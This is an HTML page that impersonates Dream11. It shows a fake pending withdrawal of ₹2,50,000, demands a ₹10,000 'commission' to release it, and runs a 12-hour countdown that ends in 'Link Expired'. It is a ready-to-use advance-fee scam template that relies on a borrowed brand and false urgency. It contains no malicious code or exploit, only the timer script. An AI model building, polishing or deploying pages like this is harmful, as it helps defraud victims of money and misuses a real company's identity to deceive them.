<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Withdrawal Page</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #d80000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: white;
      border-radius: 25px;
      padding: 30px 20px;
      width: 90%;
      max-width: 400px;
      text-align: center;
      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
    }

    .logo {
      width: 80px;
      margin-bottom: 10px;
    }

    .brand {
      color: #d80000;
      font-weight: bold;
      font-size: 20px;
      margin-bottom: 10px;
    }

    h2 {
      margin: 10px 0;
    }

    .amount {
      font-size: 28px;
      font-weight: bold;
      color: green;
    }

    .info {
      font-size: 15px;
      margin: 15px 0;
    }

    .timer {
      font-weight: bold;
      color: red;
      margin-top: 10px;
      font-size: 16px;
    }

    .btn {
      margin-top: 20px;
      padding: 12px 20px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      cursor: pointer;
    }

    .btn:hover {
      background-color: #218838;
    }

    .expired {
      font-size: 18px;
      font-weight: bold;
      color: red;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="1000076818.png" alt="Dream11 Logo" class="logo" />
    <div class="brand">DREAM11</div>
    <h2>Withdrawal Page</h2>
    <p>Your withdrawal amount is:</p>
    <p class="amount">₹2,50,000</p>
    <p class="info">You must pay ₹10,000 commission to proceed with withdrawal.</p>
    <div class="timer" id="countdown">Time left: 12:00:00</div>
    <button class="btn" id="withdrawBtn">Withdraw Now</button>
    <div class="expired" id="expiredMsg" style="display:none;">Link Expired</div>
  </div>

  <script>
    const countdownElement = document.getElementById("countdown");
    const withdrawBtn = document.getElementById("withdrawBtn");
    const expiredMsg = document.getElementById("expiredMsg");

    function startCountdown(duration) {
      let endTime = localStorage.getItem("withdrawalExpiry");
      if (!endTime) {
        endTime = Date.now() + duration;
        localStorage.setItem("withdrawalExpiry", endTime);
      }

      const interval = setInterval(() => {
        const now = Date.now();
        const distance = endTime - now;

        if (distance <= 0) {
          clearInterval(interval);
          countdownElement.style.display = "none";
          withdrawBtn.style.display = "none";
          expiredMsg.style.display = "block";
          return;
        }

        const hours = String(Math.floor(distance / (1000 * 60 * 60))).padStart(2, "0");
        const minutes = String(Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60))).padStart(2, "0");
        const seconds = String(Math.floor((distance % (1000 * 60)) / 1000)).padStart(2, "0");

        countdownElement.textContent = `Time left: ${hours}:${minutes}:${seconds}`;
      }, 1000);
    }

    startCountdown(12 * 60 * 60 * 1000); // 12 hours
  </script>
</body>
</html>
